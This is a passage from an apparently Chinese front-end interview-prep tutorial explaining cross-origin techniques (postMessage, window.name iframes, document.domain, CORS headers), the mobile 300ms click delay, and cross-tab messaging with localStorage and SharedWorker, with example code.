      ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'我发送消息给服务端'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 客户端与服务器端通信</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 监听服务器端返回的信息</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'服务器端返回：'</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
      <span class="token comment">// do something</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> ws<span class="token punctuation">;</span> <span class="token comment">// 返回websocket对象</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> wsValue <span class="token operator">=</span> <span class="token function">socketConnect</span><span class="token punctuation">(</span><span class="token string">'ws://121.40.165.18:8800'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// websocket对象</span>
</code></pre></div><p><strong>4.7 document.domain（不常用）</strong></p> <ul><li>该方式只能用于二级域名相同的情况下，比如 <code>a.test.com</code> 和 <code>b.test.com</code> 适用于该方式。</li> <li>只需要给页面添加 <code>document.domain = 'test.com'</code> 表示二级域名都相同就可以实现跨域</li></ul> <p><strong>4.8 postMessage（不常用）</strong></p> <p>在两个 <code>origin</code> 下分别部署一套页面 <code>A</code> 与 <code>B</code>，<code>A</code> 页面通过 <code>iframe</code> 加载 <code>B</code> 页面并监听消息，<code>B</code> 页面发送消息</p> <blockquote><p>这种方式通常用于获取嵌入页面中的第三方页面数据。一个页面发送消息，另一个页面判断来源并接收消息</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 发送消息端</span>
window<span class="token punctuation">.</span>parent<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token string">'http://test.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 接收消息端</span>
<span class="token keyword">var</span> mc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MessageChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
mc<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> origin <span class="token operator">=</span> event<span class="token punctuation">.</span>origin <span class="token operator">||</span> event<span class="token punctuation">.</span>originalEvent<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>origin <span class="token operator">===</span> <span class="token string">'http://test.com'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'验证通过'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p><strong>4.9 window.name（不常用）</strong></p> <blockquote><p>主要是利用 <code>window.name</code> 页面跳转不改变的特性实现跨域，即 <code>iframe</code> 加载一个跨域页面，设置 <code>window.name</code>，跳转到同域页面，可以通过 <code>$('iframe').contentWindow.name</code> 拿到跨域页面的数据</p></blockquote> <p><strong>实例说明</strong></p> <p>比如有一个<code>www.example.com/a.html</code>页面。需要通过<code>a.html</code>页面里的<code>js</code>来获取另一个位于不同域上的页面<code>www.test.com/data.html</code>中的数据。</p> <p><code>data.html</code>页面中设置一个<code>window.name</code>即可,代码如下</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  window<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;我是data.html中设置的a页面想要的数据&quot;</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ul><li>那么接下来问题来了，我们怎么把<code>data.html</code>页面载入进来呢，显然我们不能直接在<code>a.html</code>页面中通过改变<code>window.location</code>来载入<code>data.html</code>页面（因为我们现在需要实现的是<code>a.html</code>页面不跳转,但是也能够获取到<code>data.html</code>中的数据）</li> <li>具体的实现其实就是在<code>a.html</code>页面中使用一个隐藏的<code>iframe</code>来充当一个中间角色，由<code>iframe</code>去获取<code>data.html</code>的数据，然后<code>a.html</code>再去得到<code>iframe</code>获取到的数据。</li> <li>充当中间人的<code>iframe</code>想要获取到<code>data.html</code>中通过<code>window.name</code>设置的数据，只要要把这个<code>iframe</code>的<code>src</code>设置为<code>www.test.com/data.html</code>即可,然后<code>a.html</code>想要得到<code>iframe</code>所获取到的数据，也就是想要得到<code>iframe</code>的<code>widnow.name</code>的值，还必须把这个<code>iframe</code>的<code>src</code>设置成跟<code>a.html</code>页面同一个域才行，不然根据同源策略，<code>a.html</code>是不能访问到<code>iframe</code>中的<code>window.name</code>属性的</li></ul> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- a.html中的代码 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>proxy<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.test.com/data.html<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">&quot;</span></span></span> <span class="token special-attr"><span class="token attr-name">onload</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">&quot;</span><span class="token value javascript language-javascript"><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span> 

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">function</span> <span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>'proxy<span class="token punctuation">)</span><span class="token punctuation">;</span>
    iframe<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">var</span> data <span class="token operator">=</span> iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>name<span class="token punctuation">;</span>
      <span class="token comment">//上述即为获取iframe里的window.name也就是data.html页面中所设置的数据；</span>
    <span class="token punctuation">}</span>
    iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'b.html'</span><span class="token punctuation">;</span> <span class="token comment">//这里的b为随便的一个页面，只有与a.html同源就行，目的让a.html等访问到iframe里的东西，设置成about:blank也行</span>
  <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>上面的代码只是最简单的原理演示代码，你可以对使用js封装上面的过程，比如动态的创建<code>iframe</code>,动态的注册各种事件等等，当然为了安全，获取完数据后，还可以销毁作为代理的<code>iframe</code></p> <p><strong>4.10 扩展阅读</strong></p> <p><strong>跨域与监控</strong></p> <p>前端项目在统计前端报错监控时会遇到上报的内容只有 <code>Script Error</code> 的问题。这个问题也是由同源策略引起。在 <code>&lt;script&gt;</code> 标签上添加 <code>crossorigin=&quot;anonymous&quot;</code> 并且返回的 JS 文件响应头加上 <code>Access-Control-Allow-Origin: *</code> 即可捕捉到完整的错误堆栈</p> <p><strong>跨域与图片</strong></p> <p>前端项目在图片处理时可能会遇到图片绘制到 <code>Canvas</code> 上之后却不能读取像素或导出 <code>base64</code> 的问题。这个问题也是由同源策略引起。解决方式和上文相同，给图片添加 <code>crossorigin=&quot;anonymous&quot;</code> 并在返回的图片文件响应头加上 <code>Access-Control-Allow-Origin: *</code> 即可解决</p> <h3 id="移动端h5点击有300ms延迟-该如何解决"><a href="#移动端h5点击有300ms延迟-该如何解决" class="header-anchor">#</a> 移动端H5点击有300ms延迟，该如何解决</h3> <p><strong>解决方案</strong></p> <ul><li>禁用缩放，设置<code>meta</code>标签 <code>user-scalable=no</code></li> <li>现在浏览器方案 <code>meta</code>中设置<code>content=&quot;width=device-width&quot;</code></li> <li><code>fastclick.js</code></li></ul> <p><strong>初期解决方案 fastClick</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 使用</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  FastClick<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span>
</code></pre></div><p><strong>fastClick原理</strong></p> <ul><li>监听<code>touchend</code>事件（<code>touchstart</code> <code>touchend</code>会先于<code>click</code>触发）</li> <li>使用自定义<code>DOM</code>事件模拟一个<code>click</code>事件</li> <li>把默认的<code>click</code>事件（<code>300ms</code>之后触发）禁止掉</li></ul> <p><strong>触摸事件的响应顺序</strong></p> <ul><li><code>ontouchstart</code></li> <li><code>ontouchmove</code></li> <li><code>ontouchend</code></li> <li><code>onclick</code></li></ul> <p><strong>现代浏览器的改进</strong></p> <blockquote><p><code>meta</code>中设置<code>content=&quot;width=device-width&quot;</code> 就不会有<code>300ms</code>的点击延迟了。浏览器认为你要在移动端做响应式布局，所以就禁止掉了</p></blockquote> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>viewport<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>width=device-width,initial-scale=1.0<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="如何实现网页多标签tab通讯"><a href="#如何实现网页多标签tab通讯" class="header-anchor">#</a> 如何实现网页多标签tab通讯</h3> <ul><li>通过<code>websocket</code> <ul><li>无跨域限制</li> <li>需要服务端支持，成本高</li></ul></li> <li>通过<code>localStorage</code>同域通讯（推荐）
<ul><li><code>同域</code>的<code>A</code>和<code>B</code>两个页面</li> <li><code>A</code>页面设置<code>localStorage</code></li> <li><code>B</code>页面可监听到<code>localStorage</code>值的修改</li></ul></li> <li>通过<code>SharedWorker</code>通讯
<ul><li><code>SharedWorker</code>是<code>WebWorker</code>的一种</li> <li><code>WebWorker</code>可开启子进程执行<code>JS</code>，但不能操作<code>DOM</code></li> <li><code>SharedWorker</code>可单独开启一个进程，用于同域页面通讯</li> <li><code>SharedWorker</code>兼容性不太好，调试不方便，<code>IE11</code>不支持</li></ul></li></ul> <p><strong>localStorage通讯例子</strong></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- 列表页 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>localStorage message - list page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token comment">// 监听storage事件</span>
  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'storage'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>key<span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'value'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>newValue<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- 详情页 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>localStorage message - detail page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>修改标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">const</span> btn1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn1'</span><span class="token punctuation">)</span>
  btn1<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> newInfo <span class="token operator">=</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">100</span><span class="token punctuation">,</span>
      <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'标题'</span> <span class="token operator">+</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'changeInfo'</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>newInfo<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>

  <span class="token comment">// localStorage 跨域不共享</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>SharedWorker通讯例子</strong></p> <p>本地调试的时候打开chrome隐私模式验证，如果没有收到消息，打开<code>chrome://inspect/#workers</code> =&gt; <code>sharedWorkers</code> =&gt; 点击<code>inspect</code></p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/d62faae3969d2dde.png" loading="lazy" class="lazy"></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>SharedWorker message - list page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">const</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SharedWorker</span><span class="token punctuation">(</span><span class="token string">'./worker.js'</span><span class="token punctuation">)</span>
  worker<span class="token punctuation">.</span>port<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'list'</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>SharedWorker message - detail page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>修改标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">const</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SharedWorker</span><span class="token punctuation">(</span><span class="token string">'./worker.js'</span><span class="token punctuation">)</span>

  <span class="token keyword">const</span> btn1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn1'</span><span class="token punctuation">)</span>
  btn1<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'clicked'</span><span class="token punctuation">)</span>
    worker<span class="token punctuation">.</span>port<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'detail go...'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// worker.js</span>

<span class="token comment">/**
 * @description for SharedWorker
 */</span>

<span class="token keyword">const</span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token function-variable function">onconnect</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> port <span class="token operator">=</span> event<span class="token punctuation">.</span>ports<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
  set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span>

  <span class="token comment">// 接收信息</span>
  port<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// 广播消息</span>
    set<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">p</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">===</span> port<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token comment">// 不给自己广播</span>
      p<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 发送信息</span>
  port<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'worker.js done'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>连环问：如何实现网页和iframe之间的通讯</strong></p> <ul><li>使用<code>postMessage</code>通信</li> <li>注意跨域的限制和判断，判断域名的合法性</li></ul> <p>演示</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- 首页 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>
  index page
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>发送消息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>iframe1<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./child.html<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'index clicked'</span><span class="token punctuation">)</span>
    window<span class="token punctuation">.</span>iframe1<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span> <span class="token comment">// * 没有域名限制</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>

  <span class="token comment">// 接收child的消息</span>
  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'origin'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>origin<span class="token punctuation">)</span> <span class="token comment">// 来源的域名</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'index received'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- 子页面 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>
  child page
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>发送消息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'child clicked'</span><span class="token punctuation">)</span>
    <span class="token comment">// child被嵌入到index页面，获取child的父页面</span>
    window<span class="token punctuation">.</span>parent<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'world'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span> <span class="token comment">// * 没有域名限制</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>

  <span class="token comment">// 接收parent的消息</span>
  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'origin'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>origin<span class="token punctuation">)</span> <span class="token comment">// 判断 origin 的合法性</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'child received'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>效果</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/6bb5ac2cdd9759ca.png" loading="lazy" class="lazy"></p> <h3 id="requestidlecallback和requestanimationframe有什么区别"><a href="#requestidlecallback和requestanimationframe有什么区别" class="header-anchor">#</a> requestIdleCallback和requestAnimationFrame有什么区别</h3> <p>由<code>react fiber</code>引起的关注</p> <ul><li>组件树转为链表，可分段渲染</li> <li>渲染时可以暂停，去执行其他高优先级任务，空闲时在继续渲染（<code>JS</code>是单线程的，<code>JS</code>执行的时候没法去<code>DOM</code>渲染）</li> <li>如何判断空闲？<code>requestIdleCallback</code></li></ul> <p><strong>区别</strong></p> <ul><li><code>requestAnimationFrame</code> 每次渲染完在执行，高优先级</li> <li><code>requestIdleCallback</code> 空闲时才执行，低优先级</li> <li>都是宏任务，要等待DOM渲染完后在执行</li></ul> <p><img alt="" data-src="https://s.poetries.work/images/20210414212916.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/01/c49d6ea59a1482e4.png" loading="lazy" class="lazy"></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>requestAnimationFrame<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>change<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>box<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">const</span> box <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'box'</span><span class="token punctuation">)</span>
  
